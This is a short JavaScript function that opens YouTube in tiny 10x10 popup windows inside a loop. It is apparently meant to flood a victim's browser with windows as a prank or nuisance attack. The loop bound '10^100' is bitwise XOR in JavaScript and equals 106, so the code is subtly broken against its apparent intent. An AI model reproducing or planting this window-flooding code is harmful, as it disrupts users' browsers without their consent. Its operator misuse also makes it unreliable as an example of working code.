function triggerNewTab() {
    let number = 0;
    while (number <= 10^100) {
      number +=1;
      const newTab = window.open('https://www.youtube.com/', '_blank',"width=10, height=10");
    }
  }